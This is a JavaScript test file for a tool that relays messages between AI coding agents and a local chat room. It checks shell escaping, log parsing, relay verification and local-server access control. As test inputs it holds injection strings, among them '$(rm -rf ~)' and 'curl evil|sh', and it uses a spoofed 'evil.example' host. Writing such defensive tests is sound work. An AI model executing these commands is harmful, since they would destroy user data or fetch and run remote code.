import assert from 'node:assert/strict';
import { once } from 'node:events';
import { appendFileSync, mkdtempSync } from 'node:fs';
import { createServer, request } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';

process.env.CROSSTALK_HOME = mkdtempSync(join(tmpdir(), 'crosstalk-'));
const core = await import('../lib/core.js');
const log = await import('../lib/log.js');
const { resolve } = await import('../lib/antigravity.js');
const { checkRelay } = await import('../lib/claude.js');
const { serve } = await import('../lib/ui.js');

test('header tells the receiver who wrote, from where, and how to reply', () => {
  assert.equal(core.header({ agent: 'claude', name: 'API review' }), `[crosstalk] From Claude, session 'API review'. Reply with: crosstalk send claude 'API review' '<reply>'`);
  assert.equal(core.header({ agent: 'codex', id: 'abc', name: 'Fix login' }), `[crosstalk] From Codex, thread 'Fix login'. Reply with: crosstalk send codex abc '<reply>'`);
  assert.equal(core.header({ agent: 'antigravity', id: null, name: 'Antigravity' }), `[crosstalk] From Antigravity. Reply with: crosstalk send antigravity current '<reply>'`);
  assert.match(core.header({ agent: 'terminal', name: 'terminal' }), /^\[crosstalk\] From a terminal \(sender not verified\)\. Reply with: crosstalk send user/);
  assert.match(core.header({ agent: 'user', name: 'you' }), /^\[crosstalk\] From the user, in the crosstalk room\./);
});

test('a session name cannot inject shell code into the reply command', () => {
  const h = core.header({ agent: 'claude', name: "Fix `npm test` $(rm -rf ~) it's" });
  assert.ok(h.includes(`'Fix \`npm test\` $(rm -rf ~) it'\\''s'`), h);
});

test('--from is used only when it is a conversation id', () => {
  assert.equal(core.whoami('x; curl evil|sh #').id ?? null, process.env.CLAUDE_CODE_SESSION_ID ? core.whoami().id : null);
});

test('sending to the room logs the message', async () => {
  const to = await core.send('user', null, 'hi', { agent: 'claude', id: '1', name: 'A' });
  assert.deepEqual(to, { agent: 'user', id: null, name: 'you' });
  assert.equal(log.readAll().at(-1).text, 'hi');
});

test('a broken log line does not hide the others', () => {
  appendFileSync(log.FILE, '{not json\n');
  log.append({ from: { agent: 'user' }, to: { agent: 'user' }, text: 'after' });
  assert.deepEqual(log.readAll().map((m) => m.text), ['hi', 'after']);
});

test('unknown agents are rejected', async () => {
  await assert.rejects(core.send('nobody', 'x', 'hi', { agent: 'terminal' }), /Unknown agent/);
});

test('Antigravity targets: exact title wins, ambiguity is refused', () => {
  const rows = [{ id: 'a', name: 'API review' }, { id: 'b', name: 'API review v2' }, { id: 'c', name: 'Landing page' }];
  assert.equal(resolve(rows, 'api review'), 'a');
  assert.equal(resolve(rows, 'landing'), 'c');
  assert.throws(() => resolve(rows, 'API'), /matches 2 conversations/);
  assert.throws(() => resolve(rows, 'nothing'), /No Antigravity conversation/);
});

test('the relay must make exactly the one requested SendMessage call', () => {
  const call = (input, id = 't1') => JSON.stringify({ type: 'assistant', message: { content: [{ type: 'tool_use', id, name: 'SendMessage', input }] } });
  const result = (id = 't1', is_error = false) => JSON.stringify({ type: 'user', message: { content: [{ type: 'tool_result', tool_use_id: id, is_error, content: 'ok' }] } });
  const good = { to: 'S', message: 'hello' };
  assert.equal(checkRelay([call(good), result()].join('\n'), 'S', 'hello'), null);
  assert.equal(checkRelay([call(good), call(good), result()].join('\n'), 'S', 'hello'), null); // the same call streamed twice
  assert.match(checkRelay([call(good), call(good, 't2'), result()].join('\n'), 'S', 'hello'), /saw 2/);
  assert.match(checkRelay([call({ to: 'S', message: 'other' }), result()].join('\n'), 'S', 'hello'), /changed/);
  assert.match(checkRelay([call(good), result('t1', true)].join('\n'), 'S', 'hello'), /ok/);
  assert.match(checkRelay('could not be sent', 'S', 'hello'), /saw 0/);
});

test('the room refuses other hosts and requests without its token', async () => {
  const free = createServer().listen(0);
  await once(free, 'listening');
  const { port } = free.address();
  free.close();
  const server = await serve(port, false);
  const status = (path, headers = {}) =>
    new Promise((ok) => request({ host: '127.0.0.1', port, path, headers }, (res) => ok(res.statusCode)).end());
  try {
    assert.equal(await status('/'), 200);
    assert.equal(await status('/', { host: 'evil.example' }), 403);
    assert.equal(await status('/api/state'), 401);
    assert.equal(await status('/events?token=wrong'), 401);
  } finally {
    server.close();
  }
});
